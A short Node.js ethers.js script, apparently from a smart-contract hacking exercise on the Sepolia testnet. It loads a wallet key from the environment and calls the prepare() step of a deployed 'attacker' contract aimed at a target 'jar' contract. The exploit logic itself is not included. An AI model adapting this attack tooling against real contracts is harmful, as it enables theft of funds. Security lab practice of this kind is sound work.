const ethers = require('ethers');
require('dotenv').config();

const attackerABI = [{"inputs":[{"internalType":"address","name":"_jar","type":"address"}],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"get","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"jar","outputs":[{"internalType":"contract IJar","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"prepare","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];

async function main() {

  const url = process.env.SEPOLIA_URL;
  const attackerAddress = process.env.ATTACKER_ADDRESS;

  const provider = new ethers.JsonRpcProvider(url);
  let privateKey = process.env.PRIVATE_KEY;
  let wallet = new ethers.Wallet(privateKey, provider);

  const attackerContract = new ethers.Contract(
    attackerAddress,
    attackerABI,
    wallet
  );

  await attackerContract.prepare();
  console.log("Attacker's prepare() called")
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error);
    process.exit(1);
  });


